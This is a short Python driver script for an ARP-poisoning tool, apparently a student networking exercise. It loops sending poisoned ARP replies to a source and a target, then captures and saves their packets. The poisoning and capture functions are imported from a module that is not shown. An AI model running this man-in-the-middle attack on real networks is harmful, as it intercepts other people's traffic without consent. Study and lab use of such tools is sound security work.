import sys
from inquisitor_obj import *

def main():
	if len(sys.argv) != 5:
		sys.exit(1)

	try:

		inquisitor = Inquisitor(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

		while True:
			if not inquisitor.target.poisoned or not inquisitor.source.poisoned:
				inquisitor.poisoned_arp_reply(inquisitor.looking_for_arp_requests())
			else:
				inquisitor.save_packets(inquisitor.capturing_packets())

	except KeyboardInterrupt:
		print("\nARP monitor stopped.")
	except Exception as e:
		print("\nFail in main loop.")

if __name__ == "__main__":
	main()
